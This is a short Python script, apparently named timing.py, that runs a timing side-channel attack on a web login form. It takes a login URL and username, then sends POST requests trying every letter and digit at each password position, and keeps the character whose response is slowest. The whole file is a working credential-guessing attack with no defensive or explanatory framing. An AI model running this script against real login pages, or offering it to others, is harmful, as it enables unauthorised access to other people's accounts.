import requests
import string
import sys

password='xxxxxxxxxxxxxx'

characters=list(string.ascii_letters+string.digits)

if __name__ == "__main__":
    if (len(sys.argv)<3):
        print('Usage:\npython timing.py login_url username\nExample:\npython timing.py http://example.com/login admin')
    else:
        loginUrl=sys.argv[1]
        username=sys.argv[2]
        for i in range(0,len(password)):
            timings={}
            for c in characters:
                tempPassword=password[:i]+c+password[i+1:]
                result = requests.post(loginUrl, headers={'Content-Type': 'application/x-www-form-urlencoded'},data={'username':username, 'password' :tempPassword, 'submit': 'submit'})
                resultTime=result.elapsed.total_seconds()
                timings[tempPassword]=resultTime
                print(tempPassword,':',resultTime)
            password=max(timings, key=timings.get)
            print('assuming '+password)

